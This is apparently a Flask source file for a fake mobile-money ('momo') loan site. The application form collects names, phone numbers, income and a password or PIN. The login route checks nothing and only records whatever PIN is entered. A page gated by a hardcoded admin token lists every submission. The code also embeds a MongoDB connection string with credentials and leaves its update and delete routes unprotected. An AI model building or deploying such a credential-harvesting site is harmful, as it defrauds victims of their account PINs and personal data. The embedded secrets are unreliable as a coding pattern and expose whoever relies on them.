from flask import Flask, render_template, request, redirect, url_for, session
from pymongo import MongoClient
from bson.objectid import ObjectId
import random
import os

app = Flask(__name__)
app.secret_key = "super_secret_momo_key"  # Needed for session management

# MongoDB connection
client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
db = client["momo_loan_db"]
applications_collection = db["applications"]

# Temporary memory store for pending OTP verifications
pending_applications = {}

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/apply", methods=["GET", "POST"])
def apply():
    if request.method == "POST":
        phone = request.form.get("phone")
        otp_code = str(random.randint(1000, 9999))  # Generate 4-digit OTP
        
        # Gather form data temporarily
        pending_applications[phone] = {
            "loan_type": request.form.get("loan_type"),
            "amount": request.form.get("amount"),
            "term": request.form.get("term"),
            "purpose": request.form.get("purpose"),
            "first_name": request.form.get("first_name"),
            "last_name": request.form.get("last_name"),
            "phone": phone,
            "password": request.form.get("password") or request.form.get("pin"),  # Captures password/PIN field
            "employment": request.form.get("employment"),
            "income": request.form.get("income"),
            "status": "Pending Approval",
            "app_id": "APP-" + os.urandom(4).hex().upper(),
            "otp_code": otp_code
        }
        
        # --- BULK SMS INTEGRATION HOOK ---
        print(f"DEBUG OTP for {phone}: {otp_code}")  # Shows in your server terminal
        
        # Redirect user to the OTP verification screen
        return redirect(url_for("verify_otp_page", phone=phone))
        
    return render_template("apply.html")

@app.route("/verify-otp", methods=["GET", "POST"])
def verify_otp_page():
    phone = request.args.get("phone") or request.form.get("phone")
    
    if request.method == "POST":
        user_entered_otp = request.form.get("otp")
        app_data = pending_applications.get(phone)
        
        if app_data and user_entered_otp == app_data["otp_code"]:
            # OTP matches! Permanently save to MongoDB Atlas
            clean_data = {k: v for k, v in app_data.items() if k != "otp_code"}
            inserted_id = applications_collection.insert_one(clean_data).inserted_id
            
            session["current_app_id"] = str(inserted_id)
            del pending_applications[phone]  # Clear temp store
            
            return redirect(url_for("pending"))
        else:
            return render_template("verify_otp.html", phone=phone, error="Invalid OTP code. Please try again.")
            
    return render_template("verify_otp.html", phone=phone)

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        phone = request.form.get("phone")
        pin = request.form.get("pin")
        
        user_record = applications_collection.find_one({"phone": phone})
        if user_record:
            applications_collection.update_one(
                {"_id": user_record["_id"]},
                {"$set": {"password": pin}}
            )
            session["current_app_id"] = str(user_record["_id"])
            
        return redirect(url_for("pending"))
    return render_template("login.html")

@app.route("/pending")
def pending():
    app_id = session.get("current_app_id", "APP-1791729940413")
    return render_template("pending.html", app_id=app_id)

@app.route("/admin")
def admin_dashboard():
    # Admin security check using query parameter: ?admin=ADMIN036
    admin_token = request.args.get("admin")
    if admin_token != "ADMIN036":
        return "Unauthorized Access", 403
    
    # Fetch all user submissions from MongoDB
    all_apps = list(applications_collection.find())
    return render_template("admin.html", applications=all_apps)

@app.route("/admin/update/<app_id>/<status>")
def update_status(app_id, status):
    applications_collection.update_one({"_id": ObjectId(app_id)}, {"$set": {"status": status}})
    return redirect(url_for("admin_dashboard", admin="ADMIN036"))

@app.route("/admin/delete/<app_id>")
def delete_application(app_id):
    # Deletes specific record from MongoDB
    applications_collection.delete_one({"_id": ObjectId(app_id)})
    return redirect(url_for("admin_dashboard", admin="ADMIN036"))

if __name__ == "__main__":
    app.run(debug=True, port=5000)